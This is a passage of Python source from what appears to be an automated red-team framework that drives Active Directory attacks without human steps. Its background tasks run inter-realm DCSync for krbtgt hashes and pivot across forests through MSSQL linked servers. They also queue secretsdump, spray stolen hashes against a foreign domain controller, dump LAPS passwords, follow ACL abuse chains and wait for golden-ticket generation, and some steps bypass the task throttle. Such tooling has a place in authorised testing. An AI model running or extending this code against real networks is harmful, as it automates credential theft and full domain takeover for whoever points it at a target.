                            f"{foreign_domain} (via inter-realm ticket)!"
                        )

                if ir_krbtgt:
                    aes_val = ir_krbtgt_aes.group(1) if ir_krbtgt_aes else ""
                    state.add_hash(
                        Hash(
                            username="krbtgt",
                            domain=foreign_domain,
                            hash_type="NTLM",
                            hash_value=ir_krbtgt.group(1),
                            aes_key=aes_val,
                            source=f"auto_foreign_dcsync:inter_realm:{trust_account}",
                        ),
                        "auto_foreign_dcsync",
                    )

                if ir_admin or ir_krbtgt:
                    await dispatcher._checkpoint()
                    if state.all_forests_dominated():
                        logger.success("🌲🏆 ALL FORESTS DOMINATED via inter-realm ticket DCSync!")
                        state.completed = True
                        await dispatcher._checkpoint()
                        return
                # Inter-realm failed — log SPN validation hint
                elif "SPN target name validation" in ir_output:
                    logger.warning(
                        f"🌲 Auto-foreign-dcsync: inter-realm DCSync blocked by "
                        f"SPN target name validation on {foreign_domain} DC. "
                        f"Falling back to FSP/MSSQL/ACL paths."
                    )
                else:
                    logger.warning(
                        f"🌲 Auto-foreign-dcsync: inter-realm DCSync failed for "
                        f"{foreign_domain}, output: {ir_output[:500]!r}"
                    )

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Auto foreign DCSync error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_cross_forest_pivot(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 60.0,
) -> None:
    """
    Background task that dispatches cross-forest attack paths when trust key DCSync fails.

    After DA is achieved on the primary domain and undominated forests remain, this task:
    1. Dispatches FSP enumeration to discover cross-forest group memberships
    2. Re-scans MSSQL hosts with cross-forest context for linked server pivoting
    3. Dispatches RBCD/LAPS attacks based on FSP discoveries

    This provides fallback paths when inter-realm ticket DCSync is blocked by
    SPN target name validation on modern patched DCs.
    """
    logger.info("🌲 Auto-cross-forest-pivot: background task started")

    while True:
        try:
            await asyncio.sleep(check_interval)

            state = dispatcher.shared_state

            if state.completed:
                logger.info("🌲 Auto-cross-forest-pivot: operation complete, stopping")
                break

            # Only relevant in multi-forest mode with DA and undominated forests
            if not get_multi_forest_mode():
                continue
            if not state.has_domain_admin:
                continue

            # Sync hosts/domains from Redis (picks up CLI inject-host data)
            synced = await state.sync_hosts_and_domains_from_redis()
            if synced:
                logger.info(f"🌲 Auto-cross-forest-pivot: synced {synced} new items from Redis")

            foreign = state._get_foreign_domains()
            undominated = state.get_undominated_forests()
            if not undominated:
                if foreign:
                    # All known foreign forests are dominated — we're done
                    logger.info("🌲 Auto-cross-forest-pivot: all forests dominated, stopping")
                    break
                # No foreign domains discovered yet — keep waiting
                continue

            logger.info(
                f"🌲 Auto-cross-forest-pivot: cycle — "
                f"undominated={undominated}, "
                f"vulns={len(state.discovered_vulnerabilities)}, "
                f"exploited={len(state.exploited_vulnerabilities)}"
            )

            # Sync state from Redis (same pattern as _auto_foreign_dcsync)
            if dispatcher._task_queue and getattr(dispatcher._task_queue, "redis", None):
                try:
                    redis_client = dispatcher._task_queue.redis
                    dc_key = f"ares:op:{state.operation_id}:domain_controllers"
                    redis_dcs = await redis_client.hgetall(dc_key)
                    if redis_dcs:
                        for dc_domain, dc_ip_val in redis_dcs.items():
                            d = dc_domain if isinstance(dc_domain, str) else dc_domain.decode()
                            ip = dc_ip_val if isinstance(dc_ip_val, str) else dc_ip_val.decode()
                            if d.lower() not in state.domain_controllers:
                                state.domain_controllers[d.lower()] = ip

                    from ares.core.state_backend import RedisStateBackend

                    backend = RedisStateBackend(redis_client, state.operation_id)
                    redis_creds = await backend.get_credentials()
                    for c in redis_creds:
                        existing_cred = next(
                            (
                                ex
                                for ex in state.all_credentials
                                if ex.username.lower() == c.username.lower()
                                and ex.domain.lower() == (c.domain or "").lower()
                            ),
                            None,
                        )
                        if existing_cred is None:
                            state.all_credentials.append(c)
                        elif c.is_admin and not existing_cred.is_admin:
                            existing_cred.is_admin = True

                    redis_hosts = await backend.get_hosts()
                    for h in redis_hosts:
                        if not any(existing.ip == h.ip for existing in state.all_hosts):
                            state.add_host(h)
                except Exception as sync_err:
                    logger.warning(f"🌲 Auto-cross-forest-pivot: Redis sync error: {sync_err}")

            # ── Phase A: FSP Enumeration Dispatch ──
            # For each undominated forest with a known DC, dispatch FSP enumeration
            for foreign_domain in undominated:
                fd_lower = foreign_domain.lower()
                dc_ip = state.domain_controllers.get(fd_lower)
                if not dc_ip:
                    # Try to find from hosts
                    for host in state.all_hosts:
                        if host.is_dc and host.hostname:
                            h_domain = ".".join(host.hostname.lower().split(".")[1:])
                            if h_domain == fd_lower and host.ip:
                                dc_ip = host.ip
                                break
                if not dc_ip:
                    continue

                # Find a credential we can use — prefer cross-domain or DA creds
                fsp_cred = None
                # First: try credentials for the foreign domain itself
                for cred in state.all_credentials:
                    if cred.domain and cred.domain.lower() == fd_lower and cred.password:
                        fsp_cred = cred
                        break
                # Second: try DA credentials from dominated domains (may work via trust)
                if not fsp_cred:
                    da_domains = {d.lower() for d in state.domain_admin_domains}
                    for cred in state.all_credentials:
                        if (
                            cred.domain
                            and cred.domain.lower() in da_domains
                            and cred.password
                            and cred.is_admin
                        ):
                            fsp_cred = cred
                            break

                if not fsp_cred:
                    continue

                dedup_key = f"{fd_lower}:{dc_ip}:{fsp_cred.username.lower()}"
                if state.is_processed("processed_fsp_enumerations", dedup_key):
                    continue

                state.mark_processed("processed_fsp_enumerations", dedup_key)

                logger.info(
                    f"🌲 Auto-cross-forest-pivot: dispatching FSP enumeration on "
                    f"{foreign_domain} DC {dc_ip} with {fsp_cred.username}@{fsp_cred.domain}"
                )

                # Find source domain (the dominated domain) for SID resolution
                source_domain = ""
                for da_domain in state.domain_admin_domains:
                    if da_domain.lower() != fd_lower:
                        source_domain = da_domain
                        break

                # Dispatch as a recon task
                await dispatcher._throttled_submit_task(
                    task_type="recon",
                    target_role="recon",
                    payload={
                        "tool": "enumerate_foreign_security_principals",
                        "domain": foreign_domain,
                        "target_ips": [dc_ip],
                        "target_domain": foreign_domain,
                        "username": fsp_cred.username,
                        "password": fsp_cred.password,
                        "dc_ip": dc_ip,
                        "source_domain": source_domain,
                    },
                    source_agent="auto_cross_forest_pivot",
                    priority=2,
                )

            # ── Phase B: Cross-Forest MSSQL Re-scan ──
            # Force re-queue MSSQL vulns with fresh credentials and cross-forest context.
            # Runs every cycle (not just once) because new creds keep arriving
            # (e.g., DA achieved → secretsdump → many more creds than initial queue).
            try:
                queued = await dispatcher.scan_hosts_for_mssql(force_requeue=True)
                if queued > 0:
                    logger.info(
                        f"🌲 Auto-cross-forest-pivot: re-queued {queued} MSSQL "
                        f"vulnerability(ies) with fresh credentials + cross-forest context"
                    )
            except Exception as mssql_err:
                logger.warning(f"🌲 Auto-cross-forest-pivot: MSSQL re-scan error: {mssql_err}")

            # ── Phase B1.5: MSSQL Linked Server Cross-Forest Dispatch ──
            # When MSSQL hosts in dominated domains have linked servers to foreign
            # domains, dispatch explicit cross-forest MSSQL exploitation tasks.
            # This handles the sql02→sql01 linked server chain:
            # 1. Agent exploits sql02 MSSQL (dominated domain)
            # 2. Discovers SQL01 linked server pointing to foreign domain
            # 3. We dispatch a new task specifically for the linked server pivot
            #
            # Also dispatches targeted MSSQL tasks on foreign-domain MSSQL hosts
            # using ALL available credentials (not just the stale ones from initial queue).
            for foreign_domain in undominated:
                fd_lower = foreign_domain.lower()

                # Find MSSQL hosts in foreign domain
                foreign_mssql_hosts = []
                for host in state.all_hosts:
                    if not host.hostname or "." not in host.hostname:
                        continue
                    host_domain = host.hostname.lower().split(".", 1)[-1]
                    if host_domain != fd_lower:
                        continue
                    services_lower = [s.lower() for s in host.services]
                    if any(
                        ind in svc for svc in services_lower for ind in ("mssql", "1433", "ms-sql")
                    ):
                        foreign_mssql_hosts.append(host)

                # Find MSSQL hosts in dominated domains that could have linked servers
                # to foreign domain (these are the pivot points)
                da_domains = {d.lower() for d in state.domain_admin_domains}
                for host in state.all_hosts:
                    if not host.hostname or "." not in host.hostname:
                        continue
                    host_domain = host.hostname.lower().split(".", 1)[-1]
                    if host_domain not in da_domains:
                        continue
                    services_lower = [s.lower() for s in host.services]
                    has_mssql = any(
                        ind in svc for svc in services_lower for ind in ("mssql", "1433", "ms-sql")
                    )
                    if not has_mssql:
                        continue

                    # Dispatch linked server pivot task for this dominated-domain MSSQL host
                    pivot_key = f"mssql_linked_pivot:{host.ip}:{fd_lower}"
                    if state.is_processed("processed_cross_forest_pivots", pivot_key):
                        continue

                    sql_creds = dispatcher._find_sql_credentials()
                    if not sql_creds:
                        continue

                    state.mark_processed("processed_cross_forest_pivots", pivot_key)

                    # Build foreign host targets for the prompt
                    foreign_targets = [f"{fh.hostname} ({fh.ip})" for fh in foreign_mssql_hosts]

                    logger.info(
                        f"🌲 Auto-cross-forest-pivot: dispatching MSSQL linked server "
                        f"pivot from {host.hostname} ({host.ip}) targeting {fd_lower} "
                        f"with {len(sql_creds)} credentials"
                    )

                    # Extract MSSQL port from services (named instances may use non-1433)
                    mssql_port = 1433
                    for svc in host.services:
                        svc_lower = svc.lower()
                        if any(ind in svc_lower for ind in ("mssql", "ms-sql", "sqlserver")):
                            import re as _re

                            _pm = _re.match(r"(\d+)/", svc)
                            if _pm:
                                mssql_port = int(_pm.group(1))
                                break

                    port_note = (
                        f" MSSQL is on port {mssql_port} (non-standard) — pass port={mssql_port} to all mssql_ tools."
                        if mssql_port != 1433
                        else ""
                    )

                    # Identify known sysadmins from existing MSSQL vuln data
                    known_sysadmins: list[str] = []
                    for vuln in state.discovered_vulnerabilities.values():
                        if vuln.target == host.ip and vuln.vuln_type == "mssql_impersonation":
                            acct = vuln.details.get("account_name", "")
                            if acct:
                                known_sysadmins.append(acct)
                    # Also check credentials known to be admin
                    for sc in sql_creds:
                        if sc.get("is_admin") == "True" and sc["username"] not in known_sysadmins:
                            known_sysadmins.append(sc["username"])

                    sysadmin_note = ""
                    if known_sysadmins:
                        sysadmin_note = f" Known sysadmins: {', '.join(known_sysadmins)}."

                    # Queue as a high-priority exploit — the linked server is the path
                    pivot_details: dict[str, Any] = {
                        "hostname": host.hostname,
                        "services": host.services,
                        "mssql_port": mssql_port,
                        "available_credentials": sql_creds,
                        "note": (
                            f"Cross-forest MSSQL pivot: {host_domain} → {foreign_domain}.{port_note}{sysadmin_note} "
                            f"Known foreign MSSQL hosts: {', '.join(foreign_targets) if foreign_targets else 'unknown'}. "
                            f"Check for linked servers and impersonation."
                        ),
                    }

                    await dispatcher.queue_vulnerability(
                        vuln_type="mssql_cross_forest_pivot",
                        target=host.ip,
                        details=pivot_details,
                        discovered_by="auto_cross_forest_pivot",
                    )

                # Also dispatch direct MSSQL exploitation on foreign-domain MSSQL hosts
                # using cross-domain Windows auth (trust allows this)
                for fhost in foreign_mssql_hosts:
                    direct_key = f"mssql_foreign_direct:{fhost.ip}:{fd_lower}"
                    if state.is_processed("processed_cross_forest_pivots", direct_key):
                        continue

                    sql_creds = dispatcher._find_sql_credentials()
                    if not sql_creds:
                        continue

                    state.mark_processed("processed_cross_forest_pivots", direct_key)

                    logger.info(
                        f"🌲 Auto-cross-forest-pivot: dispatching direct MSSQL exploitation on "
                        f"foreign host {fhost.hostname} ({fhost.ip}) with {len(sql_creds)} credentials"
                    )

                    # Extract MSSQL port from foreign host services
                    fhost_mssql_port = 1433
                    for svc in fhost.services:
                        svc_lower = svc.lower()
                        if any(ind in svc_lower for ind in ("mssql", "ms-sql", "sqlserver")):
                            import re as _re

                            _pm = _re.match(r"(\d+)/", svc)
                            if _pm:
                                fhost_mssql_port = int(_pm.group(1))
                                break

                    fport_note = (
                        f" MSSQL port: {fhost_mssql_port} — pass port={fhost_mssql_port} to all mssql_ tools."
                        if fhost_mssql_port != 1433
                        else ""
                    )

                    direct_details: dict[str, Any] = {
                        "hostname": fhost.hostname,
                        "services": fhost.services,
                        "mssql_port": fhost_mssql_port,
                        "available_credentials": sql_creds,
                        "note": (
                            f"Cross-forest MSSQL target in {foreign_domain}.{fport_note} "
                            f"Check for impersonation and linked servers."
                        ),
                    }

                    await dispatcher.queue_vulnerability(
                        vuln_type="mssql_cross_forest_pivot",
                        target=fhost.ip,
                        details=direct_details,
                        discovered_by="auto_cross_forest_pivot",
                    )

            # ── Phase B2: Auto-secretsdump on exploited MSSQL foreign hosts ──
            # When MSSQL linked server / impersonation succeeds on a foreign host,
            # the agent gets sa access but may not follow through to secretsdump.
            # Dispatch secretsdump explicitly to extract local admin hashes.
            for foreign_domain in undominated:
                fd_lower = foreign_domain.lower()
                for vuln in list(state.discovered_vulnerabilities.values()):
                    if not vuln.vuln_type.startswith("mssql_"):
                        continue
                    if vuln.vuln_id not in state.exploited_vulnerabilities:
                        continue
                    # Check if this MSSQL vuln targets a host in the foreign domain
                    target_host = None
                    for host in state.all_hosts:
                        if host.ip == vuln.target and host.hostname:
                            host_domain = (
                                host.hostname.lower().split(".", 1)[-1]
                                if "." in host.hostname
                                else ""
                            )
                            if host_domain == fd_lower:
                                target_host = host
                                break
                    if not target_host:
                        continue

                    sd_key = f"mssql_secretsdump:{fd_lower}:{vuln.target}"
                    if state.is_processed("processed_cross_forest_pivots", sd_key):
                        continue
                    state.mark_processed("processed_cross_forest_pivots", sd_key)

                    # Find best credential for secretsdump (prefer creds from this domain)
                    sd_cred = None
                    for cred in state.all_credentials:
                        if (
                            cred.has_usable_password
                            and cred.domain
                            and cred.domain.lower() == fd_lower
                        ):
                            sd_cred = cred
                            break
                    # Fall back to any credential with a usable password
                    if not sd_cred:
                        for cred in state.all_credentials:
                            if cred.has_usable_password:
                                sd_cred = cred
                                break
                    if not sd_cred:
                        continue

                    logger.info(
                        f"🌲 Auto-cross-forest-pivot: dispatching secretsdump on "
                        f"{target_host.hostname} ({vuln.target}) after MSSQL exploit "
                        f"with {sd_cred.username}@{sd_cred.domain}"
                    )
                    # Submit directly to task queue — bypass throttle for cross-forest
                    # critical path. The throttle's deferred queue can drop these tasks
                    # when at capacity, silently killing the cross-forest pipeline.
                    dc_ip = state.domain_controllers.get(fd_lower)
                    parent_id, parent_step = dispatcher._find_credential_id(
                        sd_cred.username, sd_cred.domain, sd_cred.password
                    )
                    sd_payload: dict[str, Any] = {
                        "domain": foreign_domain,
                        "target_ips": [vuln.target],
                        "dc_ip": dc_ip,
                        "username": sd_cred.username,
                        "password": sd_cred.password,
                        "reason": "mssql_exploit_secretsdump",
                        "techniques": ["secretsdump"],
                        "parent_credential_id": parent_id,
                        "parent_attack_step": parent_step,
                    }
                    if dispatcher._task_queue:
                        sd_task_id = await dispatcher._task_queue.submit_task(
                            task_type="credential_access",
                            target_role="credential_access",
                            payload=sd_payload,
                            source_agent="auto_cross_forest_pivot",
                            priority=2,
                        )
                        logger.info(
                            f"🌲 Auto-cross-forest-pivot: secretsdump task {sd_task_id} "
                            f"submitted directly (bypassed throttle)"
                        )

            # ── Phase B3: Spray foreign host hashes against foreign DC ──
            # When secretsdump on sql01 yields local admin hashes, try them
            # against other hosts in the foreign domain (especially the DC).
            # Local admin passwords are often reused across member servers and DCs.
            for foreign_domain in undominated:
                fd_lower = foreign_domain.lower()
                dc_ip = state.domain_controllers.get(fd_lower)
                if not dc_ip:
                    continue

                # Find all IPs and NetBIOS hostnames belonging to this foreign domain
                foreign_ips = set()
                foreign_netbios = set()
                for host in state.all_hosts:
                    if host.hostname and "." in host.hostname:
                        host_domain = host.hostname.lower().split(".", 1)[-1]
                        if host_domain == fd_lower:
                            foreign_ips.add(host.ip)
                            # Extract NetBIOS name (first component of FQDN)
                            foreign_netbios.add(host.hostname.lower().split(".")[0])

                for hash_obj in state.all_hashes:
                    if not _is_pass_the_hash_compatible(hash_obj.hash_value, hash_obj.hash_type):
                        continue
                    # Skip machine accounts (end with $) — they can't PTH across forests
                    if hash_obj.username.endswith("$"):
                        continue
                    # Skip krbtgt — can't authenticate
                    if hash_obj.username.lower() == "krbtgt":
                        continue
                    # Only interested in hashes from foreign domain hosts
                    # (local admin hashes have empty domain or NetBIOS hostname as domain)
                    hash_source_ip = ""
                    if hash_obj.source:
                        for fip in foreign_ips:
                            if fip in hash_obj.source:
                                hash_source_ip = fip
                                break
                    # Also check if hash domain matches foreign domain FQDN or NetBIOS hostname
                    # secretsdump output uses NetBIOS prefix (e.g., SQL01\Administrator)
                    # so hash domain may be a hostname, not the FQDN domain
                    hash_domain = (hash_obj.domain or "").lower()
                    is_foreign_hash = (
                        hash_source_ip or hash_domain == fd_lower or hash_domain in foreign_netbios
                    )

                    if not is_foreign_hash:
                        continue

                    pth_key = f"pth_foreign:{fd_lower}:{hash_obj.username.lower()}:{hash_obj.hash_value[:16]}"
                    if state.is_processed("processed_cross_forest_pivots", pth_key):
                        continue
                    state.mark_processed("processed_cross_forest_pivots", pth_key)

                    # Try this hash against all foreign domain hosts we haven't hit
                    target_ips = [ip for ip in foreign_ips if ip != hash_source_ip]
                    if dc_ip not in target_ips:
                        target_ips.insert(0, dc_ip)  # DC first — highest value
                    if not target_ips:
                        continue

                    logger.info(
                        f"🌲 Auto-cross-forest-pivot: spraying hash "
                        f"{hash_obj.username} from {hash_source_ip or hash_domain} "
                        f"against {len(target_ips)} {foreign_domain} host(s)"
                    )
                    # Submit directly — bypass throttle for cross-forest critical path
                    pth_payload: dict[str, Any] = {
                        "domain": foreign_domain,
                        "target_ips": target_ips,
                        "dc_ip": dc_ip,
                        "username": hash_obj.username,
                        "hash_value": hash_obj.hash_value,
                        "hash_type": hash_obj.hash_type,
                        "reason": "cross_forest_pth",
                        "techniques": ["secretsdump"],
                    }
                    if dispatcher._task_queue:
                        pth_task_id = await dispatcher._task_queue.submit_task(
                            task_type="credential_access",
                            target_role="credential_access",
                            payload=pth_payload,
                            source_agent="auto_cross_forest_pivot",
                            priority=2,
                        )
                        logger.info(
                            f"🌲 Auto-cross-forest-pivot: PTH task {pth_task_id} "
                            f"submitted directly (bypassed throttle)"
                        )

            # ── Phase C: FSP-Informed Attack Dispatch ──
            # Dispatch LAPS dump attempts for any foreign domain where we have creds
            for foreign_domain in undominated:
                fd_lower = foreign_domain.lower()
                dc_ip = state.domain_controllers.get(fd_lower)
                if not dc_ip:
                    continue

                for cred in state.all_credentials:
                    if not cred.domain or cred.domain.lower() != fd_lower or not cred.password:
                        continue

                    laps_key = f"laps:{fd_lower}:{dc_ip}:{cred.username.lower()}"
                    if state.is_processed("processed_cross_forest_pivots", laps_key):
                        continue

                    state.mark_processed("processed_cross_forest_pivots", laps_key)

                    logger.info(
                        f"🌲 Auto-cross-forest-pivot: dispatching LAPS dump on "
                        f"{foreign_domain} with {cred.username}@{cred.domain}"
                    )

                    await dispatcher._throttled_submit_task(
                        task_type="recon",
                        target_role="recon",
                        payload={
                            "tool": "laps_dump",
                            "domain": foreign_domain,
                            "target_ips": [dc_ip],
                            "target": dc_ip,
                            "username": cred.username,
                            "password": cred.password,
                        },
                        source_agent="auto_cross_forest_pivot",
                        priority=2,
                    )

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Auto cross-forest pivot error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_acl_chain_follow(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 30.0,
) -> None:
    """
    Automatically follow ACL chains discovered by BloodHound.

    When BloodHound discovers multi-hop ACL paths to Domain Admin,
    this automation:
    1. Tracks chain progress
    2. Dispatches tasks for each step
    3. Re-authenticates with new credentials
    4. Continues until DA is achieved
    5. Creates chains from acl_abuse vulnerabilities
    6. Detects when targeted_kerberoast steps yield cracked credentials

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between chain progress checks
    """
    from ares.core.dispatcher.acl_chains import ACLAction, ACLChainTracker

    state = dispatcher.shared_state

    # Initialize tracker if not present (with state for persistence!)
    if not hasattr(dispatcher, "_acl_chain_tracker"):
        dispatcher._acl_chain_tracker = ACLChainTracker(state=state)
    elif dispatcher._acl_chain_tracker._state is None:
        dispatcher._acl_chain_tracker.set_state(state)

    tracker: ACLChainTracker = dispatcher._acl_chain_tracker
    # Track which vulns we've already created chains for
    vuln_chains_created: set[str] = set()

    while True:
        try:
            await asyncio.sleep(check_interval)

            # Re-read state each iteration for latest tracking
            state = dispatcher.shared_state

            # Skip if DA achieved AND all forests dominated (or not multi-forest)
            if state.has_domain_admin and (
                not get_multi_forest_mode() or state.all_forests_dominated()
            ):
                continue

            # --- Phase 1: Create chains from acl_abuse vulnerabilities ---
            # This converts discovered ACL vulns into executable chains
            acl_vuln_types = {
                "acl_abuse",
                "genericall_domain_admins",
                "adminsd_holder_acl",
                "gpo_write",
            }
            for vuln in list(state.discovered_vulnerabilities.values()):
                if vuln.vuln_type not in acl_vuln_types:
                    continue
                vuln_key = f"{vuln.vuln_type}:{vuln.target}:{vuln.details.get('principal', '')}"
                if vuln_key in vuln_chains_created:
                    continue
                principal = vuln.details.get("principal", "")
                if not principal:
                    continue
                # Determine target type from vuln details
                target_type = vuln.details.get("target_type", "user")
                if vuln.vuln_type == "genericall_domain_admins":
                    target_type = "group"
                # Determine right from description or default to GenericAll
                right = "GenericAll"
                desc = vuln.details.get("description", "").lower()
                if "genericwrite" in desc:
                    right = "GenericWrite"
                elif "writedacl" in desc:
                    right = "WriteDacl"
                elif "writeowner" in desc:
                    right = "WriteOwner"
                elif "forcechangepassword" in desc:
                    right = "ForceChangePassword"

                domain = vuln.details.get("domain", "")
                if not domain and state.target:
                    domain = state.target.domain or ""

                chain = tracker.create_single_step_chain(
                    principal=principal,
                    target=vuln.target,
                    right=right,
                    domain=domain,
                    target_type=target_type,
                    discovered_by="vulnerability",
                )
                vuln_chains_created.add(vuln_key)
                if chain:
                    logger.info(
                        f"🔗 Auto-created ACL chain from {vuln.vuln_type} vuln: "
                        f"{principal} -> {vuln.target}"
                    )

            # --- Phase 2: Progress existing chains ---
            for chain in list(tracker.chains.values()):
                if chain.is_complete:
                    continue

                current_step = chain.current_step
                if not current_step:
                    continue

                step_key = f"{chain.chain_id}:{current_step.step_id}"

                # Check if already-dispatched step has completed via credential discovery
                # This handles targeted_kerberoast → crack → credential flow and
                # other async steps where the result comes via publish_credential
                if step_key in state.dispatched_acl_steps:
                    if not current_step.completed:
                        # For targeted_kerberoast: check if target's credential was cracked
                        if current_step.action == ACLAction.TARGETED_KERBEROAST:
                            for cred in state.all_credentials:
                                if (
                                    cred.username.lower() == current_step.target.lower()
                                    and cred.password
                                ):
                                    tracker.mark_step_completed(
                                        chain.chain_id,
                                        current_step.step_id,
                                        "Credential obtained via targeted kerberoast + crack",
                                        {
                                            "username": cred.username,
                                            "password": cred.password,
                                            "domain": cred.domain or chain.domain,
                                        },
                                    )
                                    logger.info(
                                        f"🔗 ACL chain {chain.chain_id}: targeted_kerberoast step "
                                        f"auto-completed - {current_step.target} credential cracked"
                                    )
                                    break
                        # For reset_password: check if target has new password in state
                        elif current_step.action == ACLAction.RESET_PASSWORD:
                            for cred in state.all_credentials:
                                if (
                                    cred.username.lower() == current_step.target.lower()
                                    and cred.password
                                    and cred.source == "acl_chain"
                                ):
                                    tracker.mark_step_completed(
                                        chain.chain_id,
                                        current_step.step_id,
                                        "Password reset completed",
                                        {
                                            "username": cred.username,
                                            "password": cred.password,
                                            "domain": cred.domain or chain.domain,
                                        },
                                    )
                                    break
                    continue

                # Check if we have credentials for the source user
                source_cred = None
                for cred in state.all_credentials:
                    if cred.username.lower() == current_step.source.lower() and cred.password:
                        source_cred = cred
                        break

                if not source_cred:
                    # Check if previous step provided a credential
                    if chain.current_step_index > 0:
                        prev_step = chain.steps[chain.current_step_index - 1]
                        if prev_step.new_credential:
                            # Create credential from previous step
                            from ares.core.models import Credential

                            source_cred = Credential(
                                username=prev_step.new_credential.get("username", ""),
                                password=prev_step.new_credential.get("password", ""),
                                domain=chain.domain,
                                source="acl_chain",
                            )
                    else:
                        logger.debug(
                            f"🔗 ACL chain {chain.chain_id}: No credentials for source {current_step.source}"
                        )
                        continue

                # Generate prompt for this step
                prompt = tracker.generate_step_prompt(chain, current_step, chain.domain)

                logger.info(
                    f"🔗 ACL chain {chain.chain_id} step {current_step.step_id}: "
                    f"{current_step.source} -> {current_step.target} ({current_step.action.value})"
                )

                # Dispatch to ACL agent
                if source_cred is None:  # Should never happen due to continue above
                    continue
                try:
                    task_id = await dispatcher.dispatch_task(
                        agent_role="acl",
                        task_type="acl_chain_step",
                        description=f"ACL chain step: {current_step.source} -> {current_step.target}",
                        payload={
                            "chain_id": chain.chain_id,
                            "step_id": current_step.step_id,
                            "source": current_step.source,
                            "target": current_step.target,
                            "right": current_step.right,
                            "action": current_step.action.value,
                            "domain": chain.domain,
                            "username": source_cred.username,
                            "password": source_cred.password,
                            "prompt": prompt,
                        },
                    )
                    state.dispatched_acl_steps.add(step_key)
                    logger.info(f"Dispatched ACL chain step: {task_id}")
                except Exception as e:
                    logger.warning(f"🔗 Failed to dispatch ACL chain step: {e}")

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Auto ACL chain error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


def _get_running_crack_tasks(dispatcher: RedTeamDispatcher) -> list[str]:
    """Get task IDs for crack tasks that are still pending (running)."""
    crack_task_ids = []
    # Snapshot to avoid "dict changed size during iteration" from concurrent access
    for task_id, task_info in list(dispatcher.shared_state.pending_tasks.items()):
        if task_info.task_type == "crack":
            crack_task_ids.append(task_id)
    return crack_task_ids


async def _wait_for_loot_collection(
    dispatcher: RedTeamDispatcher,
    grace_period: float = 60.0,
    check_interval: float = 5.0,
) -> None:
    """
    Wait for loot collection tasks (share spider, etc.) after DA is achieved.

    When DA is achieved quickly, share spidering and other credential collection
    may not have completed. This gives background tasks time to finish.

    Args:
        dispatcher: The dispatcher instance
        grace_period: Seconds to wait for loot collection
        check_interval: Seconds between status logs
    """
    state = dispatcher.shared_state
    initial_creds = len(state.all_credentials)
    initial_hashes = len(state.all_hashes)
    shares_to_spider = [
        s
        for s in state.all_shares
        if s.permissions
        and "READ" in s.permissions.upper()
        and s.name.lower() not in ("ipc$", "print$", "admin$", "c$", "d$", "e$")
    ]

    if not shares_to_spider:
        logger.debug("No readable shares to spider, skipping loot collection wait")
        return

    logger.info(
        f"🕷️ Post-DA loot collection: {len(shares_to_spider)} readable share(s), "
        f"waiting up to {grace_period}s for share spidering..."
    )

    start_time = asyncio.get_event_loop().time()

    while True:
        elapsed = asyncio.get_event_loop().time() - start_time

        if elapsed >= grace_period:
            new_creds = len(state.all_credentials) - initial_creds
            new_hashes = len(state.all_hashes) - initial_hashes
            logger.info(
                f"🕷️ Loot collection complete: +{new_creds} credentials, +{new_hashes} hashes"
            )
            break

        await asyncio.sleep(check_interval)


async def _wait_for_crack_tasks(
    dispatcher: RedTeamDispatcher,
    timeout: float | None = None,
    check_interval: float = 5.0,
) -> None:
    """
    Wait for running crack tasks to complete with a timeout.

    Args:
        dispatcher: The dispatcher instance
        timeout: Maximum seconds to wait for crack tasks (default from config)
        check_interval: Seconds between checks
    """
    if timeout is None:
        timeout = get_crack_task_grace_period()
    start_time = asyncio.get_event_loop().time()
    crack_tasks = _get_running_crack_tasks(dispatcher)

    if not crack_tasks:
        logger.debug("No running crack tasks to wait for")
        return

    logger.info(
        f"Waiting for {len(crack_tasks)} running crack task(s) to complete "
        f"(grace period: {timeout}s)"
    )

    while True:
        elapsed = asyncio.get_event_loop().time() - start_time

        if elapsed > timeout:
            remaining = _get_running_crack_tasks(dispatcher)
            if remaining:
                logger.warning(
                    f"Crack task grace period expired with {len(remaining)} task(s) "
                    f"still running: {remaining}"
                )
            break

        remaining = _get_running_crack_tasks(dispatcher)
        if not remaining:
            logger.success("All crack tasks completed within grace period")
            break

        logger.debug(
            f"Waiting for {len(remaining)} crack task(s): {remaining} "
            f"({elapsed:.0f}s/{timeout:.0f}s elapsed)"
        )
        await asyncio.sleep(check_interval)


async def _wait_for_golden_ticket(
    dispatcher: RedTeamDispatcher,
    timeout: float = 120.0,
    check_interval: float = 5.0,
) -> None:
    """
    Wait for golden ticket generation if krbtgt hash is available.

    When DA is achieved, we may have a krbtgt hash that the _auto_golden_ticket
    background task hasn't processed yet. This function waits for golden ticket
    generation to complete (or timeout) before exiting.

    Args:
        dispatcher: The dispatcher instance
        timeout: Maximum seconds to wait for golden ticket
        check_interval: Seconds between checks
    """
    state = dispatcher.shared_state

    # Find krbtgt hashes that don't have corresponding golden tickets yet
    processed_domains = {
        t.get("domain", "").lower()
        for t in state.golden_tickets
        if t.get("domain")
        and t.get("status") in ("success", "failed_no_dc", "failed_no_sid", "failed_ticketer")
    }

    pending_krbtgt_domains = set()
    for hash_obj in state.all_hashes:
        if hash_obj.username.lower() == "krbtgt" and hash_obj.hash_type.lower() == "ntlm":
            domain = (hash_obj.domain or "").lower()
            if domain and domain not in processed_domains:
                pending_krbtgt_domains.add(domain)

    if not pending_krbtgt_domains:
        if state.has_golden_ticket:
            logger.info("🎫 Golden ticket already generated")
        return

    logger.info(
        f"🎫 Waiting for golden ticket generation for {len(pending_krbtgt_domains)} domain(s): "
        f"{pending_krbtgt_domains} (timeout: {timeout}s)"
    )

    start_time = asyncio.get_event_loop().time()

    while True:
        elapsed = asyncio.get_event_loop().time() - start_time

        if elapsed > timeout:
            logger.warning(
                f"🎫 Golden ticket generation timed out after {timeout}s. "
                f"Pending domains: {pending_krbtgt_domains}"
            )
            break

        # Check if golden ticket was generated
        if state.has_golden_ticket:
            logger.success("🎫 Golden ticket generated successfully!")
            break

        # Check if all pending domains have been processed (success or failure)
        processed_domains = {
            t.get("domain", "").lower()
            for t in state.golden_tickets
            if t.get("domain")
            and t.get("status") in ("success", "failed_no_dc", "failed_no_sid", "failed_ticketer")
        }
        remaining = pending_krbtgt_domains - processed_domains
        if not remaining:
            if state.has_golden_ticket:
